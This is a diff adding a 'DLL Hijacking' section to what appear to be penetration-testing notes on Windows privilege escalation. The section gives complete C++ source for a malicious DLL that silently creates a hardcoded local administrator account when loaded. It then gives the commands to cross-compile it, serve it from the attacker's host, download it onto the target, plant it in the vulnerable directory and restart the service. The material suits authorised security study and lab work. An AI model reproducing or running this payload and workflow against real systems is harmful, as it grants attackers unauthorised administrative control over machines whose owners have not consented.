@@ -55,3 +55,47 @@ If that fails try restarting the machine altogether, leveraging the possiblity t
 ```powershell
 shutdown /r /t 0
 ```
+
+### DLL Hijacking
+Sometimes the file that hosts a binary executable that is running as a service will not be writable, but the DLLs it uses might be. In this event we have an additional way to execute system commands with elevated privilege and add our admin user.
+
+Save the following `C++` file on Kali host as `adduser.cpp`:
+```cpp
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+        i = system ("net user ggilligan12 password123! /add");
+        i = system ("net localgroup administrators ggilligan12 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+Cross compile and serve:
+```bash
+x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
+python3 -m http.server 80
+```
+Grab it on the target machine:
+```powershell
+iwr -uri http://<our IP>/adduser.dll -Outfile adduser.dll
+```
+Shift it to the vulnerable directory and rename appropriately. Then restart the relevant service:
+```powershell
+Restart-Service vulnerable-service
+```
